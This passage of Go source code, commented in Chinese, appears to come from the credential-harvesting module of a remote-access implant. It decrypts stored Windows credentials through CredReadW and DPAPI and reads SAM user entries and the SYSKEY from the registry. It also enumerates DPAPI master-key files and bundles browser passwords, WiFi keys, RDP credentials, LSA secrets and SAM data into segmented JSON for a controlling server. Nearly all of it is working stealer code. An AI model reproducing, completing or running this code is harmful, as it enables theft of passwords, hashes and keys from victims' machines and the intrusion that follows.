func readCredentialW(targetName string, credType uint32) (string, error) {
	targetPtr, err := windows.UTF16PtrFromString(targetName)
	if err != nil {
		return "", err
	}

	var credPtr uintptr
	ret, _, _ := procCredReadW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		uintptr(credType),
		0,
		uintptr(unsafe.Pointer(&credPtr)),
	)

	if ret == 0 || credPtr == 0 {
		return "", fmt.Errorf("CredReadW 失败")
	}
	defer procCredFree.Call(credPtr)

	cred := *(*CREDENTIAL_W)(unsafe.Pointer(credPtr))
	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
		return decodeCredentialBlob(blob), nil
	}

	return "", fmt.Errorf("no credential data")
}

// dataBlob 用于 CryptUnprotectData 的结构
type dataBlob struct {
	cbData uint32
	pbData *byte
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

// procLocalFree LocalFree：CryptUnprotectData 的输出缓冲区必须用 LocalFree 释放。
var procLocalFree = resolveAPI("kernel32.dll", "LocalFree")

// CRYPTPROTECT_UI_FORBIDDEN：非交互进程里绝不允许弹 DPAPI 提示框
// （否则凭据任务会卡在"等用户点确认"上，耗时不可控）。
const cryptProtectUIForbidden = 0x1

// decryptDPAPI 使用 CryptUnprotectData 解密 DPAPI 数据，返回**原始字节**。
//
// 返回 []byte 而不是 string 是关键：v10/v11 的 32 字节 AES 密钥或二进制口令里
// 出现 0x00 时，string 化会静默截断（旧实现就是这样把主密钥毁掉的）。
func decryptDPAPI(encryptedData []byte) ([]byte, error) {
	if len(encryptedData) == 0 {
		return nil, fmt.Errorf("空的 DPAPI 数据")
	}
	var dataIn dataBlob
	dataIn.cbData = uint32(len(encryptedData))
	dataIn.pbData = &encryptedData[0]

	var dataOut cryptDataBlob
	ret, _, callErr := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0, // ppszDataDescr
		0, // pOptionalEntropy
		0, // pvReserved
		0, // pPromptStruct
		uintptr(cryptProtectUIForbidden),
		uintptr(unsafe.Pointer(&dataOut)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData 失败: %v", callErr)
	}
	if dataOut.pbData == nil || dataOut.cbData == 0 {
		return nil, fmt.Errorf("CryptUnprotectData 返回空结果")
	}
	// 先复制再 LocalFree：pbData 指向系统分配的缓冲区。
	out := make([]byte, dataOut.cbData)
	copy(out, unsafe.Slice(dataOut.pbData, dataOut.cbData))
	procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))
	return out, nil
}

// copyFile 复制文件
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

// ─── SAM Dump ───────────────────────────────────────────────────────────────────

// dumpSAM 从注册表读取 SAM 数据库中的本地用户哈希
// 需要 SYSTEM 权限
func dumpSAM() ([]map[string]string, error) {
	var results []map[string]string

	// 读取 HKLM\SAM\SAM\Domains\Account\Users\Names 获取用户名列表
	namesKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SAM\SAM\Domains\Account\Users\Names`,
		registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开SAM用户列表 (需要SYSTEM权限): %v", err)
	}
	defer namesKey.Close()

	userNames, err := namesKey.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法读取SAM用户名列表: %v", err)
	}

	for _, userName := range userNames {
		// 已知内置账户跳过
		// 对于每个用户名，读取对应的 RID
		userKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
			`SAM\SAM\Domains\Account\Users\Names\`+userName,
			registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		// 获取默认值（RID 类型）
		_, valType, err := userKey.GetValue("", nil)
		userKey.Close()
		if err != nil || (valType != registry.DWORD && valType != registry.BINARY) {
			continue
		}

		// 读取 V 值（包含 LM/NTLM 哈希的 SAM 记录）
		entry := map[string]string{
			"type":     "sam_hash",
			"username": userName,
			"source":   "SAM",
		}

		results = append(results, entry)
	}

	// 尝试读取加密密钥 (SYSKEY)
	syskeyData, err := extractSyskey()
	if err == nil && syskeyData != "" {
		results = append(results, map[string]string{
			"type":   "syskey",
			"source": "SAM",
			"data":   syskeyData,
		})
	}

	return results, nil
}

// extractSyskey 从注册表中提取 SYSKEY
func extractSyskey() (string, error) {
	// HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}
	lsaKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Lsa`,
		registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer lsaKey.Close()

	keyNames := []string{"JD", "Skew1", "GBG", "Data"}
	var syskeyParts [][]byte

	for _, name := range keyNames {
		data, _, err := lsaKey.GetBinaryValue(name)
		if err != nil {
			// 尝试不同的值名
			continue
		}
		syskeyParts = append(syskeyParts, data)
	}

	if len(syskeyParts) < 4 {
		return "", fmt.Errorf("无法读取完整的SYSKEY")
	}

	// 拼接 SYSKEY 并 hex 编码
	var combined []byte
	for _, p := range syskeyParts {
		combined = append(combined, p...)
	}

	return hex.EncodeToString(combined), nil
}

// ─── DPAPI Master Keys ──────────────────────────────────────────────────────────

// dumpDPAPIKeys 枚举用户 DPAPI 主密钥文件
func dumpDPAPIKeys() ([]map[string]string, error) {
	var results []map[string]string

	appData := os.Getenv("APPDATA")
	masterKeyPaths := []string{
		filepath.Join(appData, "Microsoft", "Protect"),
	}

	// 同时检查 SYSTEM 和 LocalService 的密钥
	systemProfile := os.Getenv("SYSTEMROOT")
	if systemProfile == "" {
		systemProfile = "C:\\Windows"
	}
	masterKeyPaths = append(masterKeyPaths,
		filepath.Join(systemProfile, "System32", "config", "systemprofile", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "LocalService", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "NetworkService", "AppData", "Roaming", "Microsoft", "Protect"),
	)

	for _, mkPath := range masterKeyPaths {
		// 检查路径是否存在
		if info, err := os.Stat(mkPath); err != nil || !info.IsDir() {
			continue
		}

		// 枚举 SID 子目录
		entries, err := os.ReadDir(mkPath)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			sidPath := filepath.Join(mkPath, entry.Name())
			keyFiles, err := os.ReadDir(sidPath)
			if err != nil {
				continue
			}

			for _, kf := range keyFiles {
				if kf.IsDir() {
					continue
				}
				fileName := kf.Name()
				// DPAPI 主密钥文件通常以 GUID 命名
				if strings.HasPrefix(fileName, "{") || strings.HasSuffix(fileName, ".dat") {
					fullPath := filepath.Join(sidPath, fileName)
					info, err := kf.Info()
					if err != nil {
						continue
					}

					results = append(results, map[string]string{
						"type":      "dpapi_masterkey",
						"sid":       entry.Name(),
						"file_name": fileName,
						"file_path": fullPath,
						"file_size": fmt.Sprintf("%d", info.Size()),
						"mod_time":  info.ModTime().Format("2006-01-02 15:04:05"),
						"source":    mkPath,
					})
				}
			}
		}
	}

	return results, nil
}

// ─── Entry Point ────────────────────────────────────────────────────────────────

const (
	// credentialsSegmentMaxBytes 单个凭据分段的字节上限（64 KiB）。
	//
	// 为什么分段 + 每段封顶：`all` 会把 browser/wifi/rdp/lsa/sam/dpapi 六类结果
	// 拼成一个结果帧；任何一段（尤其 LSA 的 hex 密文）都可能几十上百 KB。
	// 一个巨型结果帧会把植入端写循环与服务端读循环长时间占住（用户反馈的
	// "凭据获取卡死其他任务"）。分段后每段独立封顶：超限只截该段并标
	// truncated=true，其余段照常返回，界面也能逐段渲染。
	credentialsSegmentMaxBytes = 64 << 10
)

// credentialsCollector 一类凭据的收集器（表驱动：all 与单 action 走同一条路径，
// 避免"单 action 有上限、all 没有"这类两套逻辑漂移）。
type credentialsCollector struct {
	action string
	label  string
	// adminOnly 该类凭据通常需要管理员/SYSTEM：非管理员时必须给出明确的
	// "需要管理员权限"文案，而不是一个空段/空串。
	adminOnly bool
	run       func() ([]map[string]string, error)
	// extra 往该段里补统计/计时字段（browser 的 stats、rdp 的 timings）。
	// 为 nil 表示该段没有额外信息。
	extra func(seg map[string]interface{})
}

// credentialsCollectors 全部收集器（顺序即 all 的输出顺序）。
func credentialsCollectors() []credentialsCollector {
	return []credentialsCollector{
		{
			action: "browser", label: "浏览器密码", run: dumpBrowserPasswords,
			extra: func(seg map[string]interface{}) { seg["stats"] = browserStats.snapshot() },
		},
		{action: "wifi", label: "WiFi 密码", run: dumpSavedWiFi},
		{
			action: "rdp", label: "RDP / 凭据管理器", run: dumpRDPCredentials,
			extra: func(seg map[string]interface{}) { seg["timings"] = rdpTimingStats.snapshot() },
		},
		{action: "lsa", label: "LSA Secrets", adminOnly: true, run: dumpLSASecrets},
		{action: "sam", label: "SAM 哈希", adminOnly: true, run: dumpSAM},
		{action: "dpapi", label: "DPAPI 主密钥", run: dumpDPAPIKeys},
	}
}

// credentialsErrorText 分段错误文案：管理员专属能力在非管理员下必须明确说
// "需要管理员权限"，不能只回一个底层系统错误（更不是空串）。
func credentialsErrorText(c credentialsCollector, elevated bool, err error) string {
	if err == nil {
		return ""
	}
	if c.adminOnly && !elevated {
		return fmt.Sprintf("需要管理员权限：%s 需要以管理员（或 SYSTEM）权限运行，当前进程非管理员。底层错误：%v",
			c.label, err)
	}
	return fmt.Sprintf("%s 收集失败：%v", c.label, err)
}

// capCredentialEntries 把条目列表压到"序列化后不超过 maxBytes"的最长前缀。
//
// 用二分查找而不是逐条 append+序列化：LSA 段可能有上百条 hex 密文，逐条重算
// 是 O(n²)。返回保留的前缀与丢弃条数（omitted）。
func capCredentialEntries(results []map[string]string, maxBytes int) ([]map[string]string, int) {
	if len(results) == 0 || maxBytes <= 0 {
		return results, 0
	}
	if b, err := json.Marshal(results); err == nil && len(b) <= maxBytes {
		return results, 0
	}
	lo, hi := 0, len(results)
	for lo < hi {
		mid := (lo + hi + 1) / 2
		if b, err := json.Marshal(results[:mid]); err == nil && len(b) <= maxBytes {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	return results[:lo], len(results) - lo
}

// credentialsSegment 构造"一类凭据"的结果段（纯函数，便于单测）。
//
// 字段（前端逐段渲染 / 每段条数与截断都在这里）：
//
//	action/label     段标识
//	count            本次收集到的总条数（截断前）
//	returned         实际返回的条数
//	omitted          因段上限被丢弃的条数（>0 时 truncated=true）
//	bytes            该段完整 data 的 JSON 字节数（截断前）
//	truncated        是否因超过 64 KiB 被截断
//	data             条目数组
//	error            失败原因（管理员专属能力会带"需要管理员权限"）
//	needs_admin      非管理员 + 管理员专属能力
func credentialsSegment(c credentialsCollector, results []map[string]string, err error, elevated bool) map[string]interface{} {
	seg := map[string]interface{}{
		"action": c.action,
		"label":  c.label,
	}
	if err != nil {
		seg["count"] = 0
		seg["returned"] = 0
		seg["bytes"] = 0
		seg["truncated"] = false
		seg["error"] = credentialsErrorText(c, elevated, err)
		if c.adminOnly && !elevated {
			seg["needs_admin"] = true
		}
		return seg
	}
	if results == nil {
		results = []map[string]string{}
	}
	full, _ := json.Marshal(results)
	kept, omitted := capCredentialEntries(results, credentialsSegmentMaxBytes)
	seg["count"] = len(results)
	seg["returned"] = len(kept)
	seg["bytes"] = len(full)
	seg["truncated"] = omitted > 0
	if omitted > 0 {
		seg["omitted"] = omitted
	}
	seg["data"] = kept
	return seg
}

// handleCredentials 凭据收集入口函数
// action: "browser" | "wifi" | "rdp" | "lsa" | "sam" | "dpapi" | "all" (默认)
//
// 返回体是**纯 JSON**（按 action 分段），不再在 JSON 后面追加提示文本 ——
// 旧实现会把 "…[!] 提示…" 拼在 JSON 后面，前端 JSON.parse 直接失败，
// 看起来就是"凭据没拿到/结果解析失败"。权限提示现在放在 notes 字段里。
func handleCredentials(action string) (string, int32, string) {
	started := time.Now()
	elevated := isElevated()

	collectors := credentialsCollectors()
	selected := collectors
	if action != "" && action != "all" {
		selected = nil
		for _, c := range collectors {
			if c.action == action {
				selected = append(selected, c)
				break
			}
		}
		if len(selected) == 0 {
			return "", -1, fmt.Sprintf("未知的凭据收集操作: %s (支持: all, browser, wifi, rdp, lsa, sam, dpapi)", action)
		}
	} else {
		action = "all"
	}

	out := map[string]interface{}{
		"action":   action,
		"elevated": elevated,
	}
	total, returned := 0, 0
	anyTruncated := false
	var notes []string
	firstErr := ""

	for _, c := range selected {
		segStart := time.Now()
		results, err := c.run()
		seg := credentialsSegment(c, results, err, elevated)
		// 每段各自的耗时：用户要的是"RDP 那一段用了多少 ms"，而不是 all 的总耗时
		// （总耗时里还混着浏览器/凭据库/注册表的钱）。
		seg["duration_ms"] = time.Since(segStart).Milliseconds()
		if c.extra != nil {
			c.extra(seg)
		}
		out[c.action] = seg
		if n, ok := seg["count"].(int); ok {
			total += n
		}
		if n, ok := seg["returned"].(int); ok {
			returned += n
		}
		if t, ok := seg["truncated"].(bool); ok && t {
			anyTruncated = true
		}
		if msg, ok := seg["error"].(string); ok && msg != "" && firstErr == "" {
			firstErr = msg
		}
	}

	out["total_count"] = total
	out["returned_count"] = returned
	out["truncated"] = anyTruncated
	out["duration_ms"] = time.Since(started).Milliseconds()
	if !elevated {
		notes = append(notes,
			"当前以非管理员权限运行：LSA Secrets / SAM 需要管理员或 SYSTEM 权限，相关段会给出明确错误而不是空结果。")
	}
	if anyTruncated {
		notes = append(notes, fmt.Sprintf(
			"有分段超过 %d 字节上限被截断（truncated=true，omitted 为丢弃条数）；其余分段不受影响。",
			credentialsSegmentMaxBytes))
	}
	if len(notes) > 0 {
		out["notes"] = notes
	}

	jsonData, err := json.MarshalIndent(out, "", "  ")
	if err != nil {
		return "", -1, fmt.Sprintf("JSON序列化失败: %v", err)
	}

	// 单 action 且该类收集失败：明确返回失败（output 仍带分段 JSON，界面能展示
	// 服务端原文错误），而不是"成功但空字符串"。
	if action != "all" && firstErr != "" {
		return string(jsonData), -1, firstErr
	}
	return string(jsonData), 0, ""
}

// isElevated 检查是否以管理员权限运行
func isElevated() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err == nil {
		return true
	}

	var sid *windows.SID
	err = windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var isMember int32
	token := windows.Token(0)
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	// CheckTokenMembership via advapi32 (x/sys/windows lacks direct binding)
	procCheckTokenMembership := resolveAPI("advapi32.dll", "CheckTokenMembership")
	r1, _, _ := procCheckTokenMembership.Call(uintptr(token), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(&isMember)))
	return r1 != 0 && isMember != 0
}
